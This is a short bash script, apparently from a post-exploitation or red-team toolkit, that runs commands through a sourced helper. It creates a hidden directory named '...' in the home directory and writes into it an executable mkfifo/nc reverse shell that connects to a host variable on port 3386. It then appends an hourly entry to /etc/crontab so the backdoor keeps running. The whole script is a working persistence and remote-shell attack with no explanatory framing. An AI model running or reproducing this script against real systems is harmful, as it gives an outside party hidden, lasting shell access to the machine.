#!/bin/bash

source "/opt/pmp/functions.sh"

PORT=3386
F="..."

call_cmd "mkdir ~/$F"
call_cmd "echo '#!/bin/bash' > ~/$F/$F"
call_cmd "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f' > ~/$F/$F"
call_cmd "chmod +x ~/$F/$F"
call_cmd "echo '5 * * * * $USER $HOME/.../...' >> /etc/crontab"